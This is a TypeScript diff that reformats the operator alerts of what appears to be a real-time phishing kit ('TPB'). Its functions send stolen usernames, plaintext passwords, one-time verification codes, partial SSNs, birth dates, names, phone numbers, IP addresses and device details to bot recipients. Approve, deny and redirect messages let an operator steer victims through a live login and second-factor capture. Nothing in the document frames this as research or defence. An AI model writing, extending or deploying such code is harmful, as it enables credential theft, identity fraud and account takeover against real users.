@@ -148,19 +148,19 @@ function locationLines(cf?: CfData): string[] {
   const offset = cf.timezone ? gmtOffset(cf.timezone) : "";
   if (offset) tzLabel += ` (${offset})`;
   return [
-    `📍 ${esc(loc)}`,
-    `🌐 <code>${esc(cf.ip || "Unknown")}</code>`,
-    `🕒 ${esc(tzLabel)}`,
-    `📡 ${esc(cf.asOrganization || "Unknown")}`,
+    `  📍 ${esc(loc)}`,
+    `  🌐 IP: <code>${esc(cf.ip || "Unknown")}</code>`,
+    `  🕒 ${esc(tzLabel)}`,
+    `  📡 ${esc(cf.asOrganization || "Unknown")}`,
   ];
 }
 
 function deviceLines(task: TaskData): string[] {
   return [
-    `📱 ${esc(task.device_info ? parseDevice(task.device_info) : "Unknown")}`,
-    `📏 ${esc(task.screen_size || "Unknown")}`,
-    `🔗 ${esc(formatReferrer(task.referrer))}`,
-    `🌐 ${esc(formatUrl(task.member_origin))}`,
+    `  📱 ${esc(task.device_info ? parseDevice(task.device_info) : "Unknown")}`,
+    `  📏 Screen: ${esc(task.screen_size || "Unknown")}`,
+    `  🔗 Ref: ${esc(formatReferrer(task.referrer))}`,
+    `  🌐 Origin: ${esc(formatUrl(task.member_origin))}`,
   ];
 }
 
@@ -170,36 +170,38 @@ export async function notifyNewTask(task: TaskData) {
   const lines: string[] = [];
 
   if (isVisit) {
-    lines.push("👁 <b>NEW VISITOR</b>  •  <i>TPB</i>");
-    lines.push("────────────────────────");
+    lines.push("👁 <b>NEW VISITOR</b>  ·  <i>TPB</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
     lines.push("");
-    lines.push("🗺 <b>Location</b>");
+    lines.push("<b>📍 Location</b>");
     lines.push(...locationLines(task.cf));
     lines.push("");
-    lines.push("🖥 <b>Device</b>");
+    lines.push("<b>🖥 Device</b>");
     lines.push(...deviceLines(task));
     lines.push("");
-    lines.push(`📅 ${esc(t.local)}  •  ${esc(t.utc)} UTC`);
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
+    lines.push(`📅 ${esc(t.local)}  ·  ${esc(t.utc)} UTC`);
   } else {
-    lines.push("🔐 <b>LOGIN REQUEST</b>  •  <i>TPB</i>");
-    lines.push("────────────────────────");
+    lines.push("🔐 <b>LOGIN REQUEST</b>  ·  <i>TPB</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
     lines.push("");
-    lines.push(`👤 <b>User</b>    <code>${esc(task.user_id)}</code>`);
-    lines.push(`🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`);
-    lines.push(`✉️ <b>Email</b>   ${esc(task.masked_email)}`);
+    lines.push("<b>🔑 Credentials</b>");
+    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
+    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
+    lines.push(`  ✉️ Email: ${esc(task.masked_email)}`);
     if (task.masked_phone && task.masked_phone !== "N/A") {
-      lines.push(`📞 <b>Phone</b>   ${esc(task.masked_phone)}`);
+      lines.push(`  📞 Phone: ${esc(task.masked_phone)}`);
     }
     lines.push("");
-    lines.push("🗺 <b>Location</b>");
+    lines.push("<b>📍 Location</b>");
     lines.push(...locationLines(task.cf));
     lines.push("");
-    lines.push("🖥 <b>Device</b>");
+    lines.push("<b>🖥 Device</b>");
     lines.push(...deviceLines(task));
     lines.push("");
-    lines.push(`📅 ${esc(t.local)}  •  ${esc(t.utc)} UTC`);
-    lines.push("");
-    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
+    lines.push(`📅 ${esc(t.local)}  ·  ${esc(t.utc)} UTC`);
+    lines.push("⏳ <i>Auto-declines in 90s</i>");
   }
 
   await sendToAll(lines.join("\n"), task.id, !isVisit);
@@ -213,36 +215,40 @@ export async function notifyAdvance(task: TaskData) {
       ? `Phone (${esc(task.masked_phone)})`
       : `Email (${esc(task.masked_email)})`;
 
-    lines.push("📨 <b>CODE DELIVERY</b>  •  <i>TPB</i>");
-    lines.push("────────────────────────");
+    lines.push("📨 <b>CODE DELIVERY</b>  ·  <i>TPB</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
     lines.push("");
-    lines.push(`👤 <b>User</b>    <code>${esc(task.user_id)}</code>`);
-    lines.push(`🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`);
-    lines.push(`✉️ <b>Send via</b>  ${target}`);
+    lines.push("<b>🔑 Credentials</b>");
+    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
+    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
+    lines.push(`  ✉️ Send via: ${target}`);
     lines.push("");
-    lines.push("🗺 <b>Location</b>");
+    lines.push("<b>📍 Location</b>");
     lines.push(...locationLines(task.cf));
     lines.push("");
-    lines.push("🖥 <b>Device</b>");
+    lines.push("<b>🖥 Device</b>");
     lines.push(...deviceLines(task));
     lines.push("");
-    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
+    lines.push("⏳ <i>Auto-declines in 90s</i>");
   } else if (task.flow_step === "code_verify") {
-    lines.push("🛡 <b>CODE VERIFICATION</b>  •  <i>TPB</i>");
-    lines.push("────────────────────────");
+    lines.push("🛡 <b>CODE VERIFICATION</b>  ·  <i>TPB</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
     lines.push("");
-    lines.push(`👤 <b>User</b>    <code>${esc(task.user_id)}</code>`);
-    lines.push(`🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`);
-    lines.push(`🔢 <b>Code</b>    <code>${esc(task.verification_code || "N/A")}</code>`);
-    lines.push(`✉️ <b>Via</b>     ${task.code_delivery_method === "phone" ? "Phone" : "Email"} (${esc(task.masked_email)})`);
+    lines.push("<b>🔑 Credentials</b>");
+    lines.push(`  👤 User: <code>${esc(task.user_id)}</code>`);
+    lines.push(`  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`);
+    lines.push(`  🔢 Code: <code>${esc(task.verification_code || "N/A")}</code>`);
+    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"} (${esc(task.masked_email)})`);
     lines.push("");
-    lines.push("🗺 <b>Location</b>");
+    lines.push("<b>📍 Location</b>");
     lines.push(...locationLines(task.cf));
     lines.push("");
-    lines.push("🖥 <b>Device</b>");
+    lines.push("<b>🖥 Device</b>");
     lines.push(...deviceLines(task));
     lines.push("");
-    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
+    lines.push("━━━━━━━━━━━━━━━━━━━━━━━━");
+    lines.push("⏳ <i>Auto-declines in 90s</i>");
   } else {
     return;
   }
@@ -252,45 +258,45 @@ export async function notifyAdvance(task: TaskData) {
 
 export function buildApprovedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
   const lines = [
-    "✅ <b>APPROVED</b>  •  <i>TPB</i>",
-    "────────────────────────",
+    "✅ <b>APPROVED</b>  ·  <i>TPB</i>",
+    "━━━━━━━━━━━━━━━━━━━━━━━━",
     "",
-    `👤 <b>User</b>    <code>${esc(task.user_id)}</code>`,
-    `🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`,
+    `  👤 User: <code>${esc(task.user_id)}</code>`,
+    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
   ];
   if (task.verification_code) {
-    lines.push(`🔢 <b>Code</b>    <code>${esc(task.verification_code)}</code>`);
-    lines.push(`✉️ <b>Via</b>     ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
+    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
+    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
   }
   return lines.join("\n");
 }
 
 export function buildDeniedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
   const lines = [
-    "❌ <b>DENIED</b>  •  <i>TPB</i>",
-    "────────────────────────",
+    "❌ <b>DENIED</b>  ·  <i>TPB</i>",
+    "━━━━━━━━━━━━━━━━━━━━━━━━",
     "",
-    `👤 <b>User</b>    <code>${esc(task.user_id)}</code>`,
-    `🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`,
+    `  👤 User: <code>${esc(task.user_id)}</code>`,
+    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
   ];
   if (task.verification_code) {
-    lines.push(`🔢 <b>Code</b>    <code>${esc(task.verification_code)}</code>`);
-    lines.push(`✉️ <b>Via</b>     ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
+    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
+    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
   }
   return lines.join("\n");
 }
 
 export function buildRedirectedMessage(task: { user_id: string; password?: string; verification_code?: string; code_delivery_method?: string }): string {
   const lines = [
-    "🔀 <b>REDIRECTED</b>  •  <i>TPB</i>",
-    "────────────────────────",
+    "🔀 <b>REDIRECTED</b>  ·  <i>TPB</i>",
+    "━━━━━━━━━━━━━━━━━━━━━━━━",
     "",
-    `👤 <b>User</b>    <code>${esc(task.user_id)}</code>`,
-    `🔑 <b>Pass</b>    <code>${esc(task.password || "N/A")}</code>`,
+    `  👤 User: <code>${esc(task.user_id)}</code>`,
+    `  🔒 Pass: <code>${esc(task.password || "N/A")}</code>`,
   ];
   if (task.verification_code) {
-    lines.push(`🔢 <b>Code</b>    <code>${esc(task.verification_code)}</code>`);
-    lines.push(`✉️ <b>Via</b>     ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
+    lines.push(`  🔢 Code: <code>${esc(task.verification_code)}</code>`);
+    lines.push(`  ✉️ Via: ${task.code_delivery_method === "phone" ? "Phone" : "Email"}`);
   }
   return lines.join("\n");
 }
@@ -329,14 +335,15 @@ export interface VerifyDetailsData {
 
 export async function sendVerifyDetailsNotification(data: VerifyDetailsData) {
   const lines = [
-    "📝 <b>VERIFY DETAILS</b>  •  <i>TPB</i>",
-    "────────────────────────",
+    "📝 <b>VERIFY DETAILS</b>  ·  <i>TPB</i>",
+    "━━━━━━━━━━━━━━━━━━━━━━━━",
     "",
-    `🔢 <b>Last 4 SSN</b>  <code>${esc(data.ssnLast4)}</code>`,
-    `📍 <b>ZIP Code</b>   <code>${esc(data.zip)}</code>`,
-    `📅 <b>Birth Date</b> <code>${esc(data.birthDate)}</code>`,
-    `👤 <b>Full Name</b>  <code>${esc(data.fullName)}</code>`,
-    `📞 <b>Phone</b>      <code>${esc(data.phoneNumber)}</code>`,
+    "<b>🔑 Personal Info</b>",
+    `  👤 Name: <code>${esc(data.fullName)}</code>`,
+    `  🔢 SSN (last 4): <code>${esc(data.ssnLast4)}</code>`,
+    `  📅 DOB: <code>${esc(data.birthDate)}</code>`,
+    `  📍 ZIP: <code>${esc(data.zip)}</code>`,
+    `  📞 Phone: <code>${esc(data.phoneNumber)}</code>`,
   ];
   const pairs = getBotPairs();
   for (const p of pairs) {
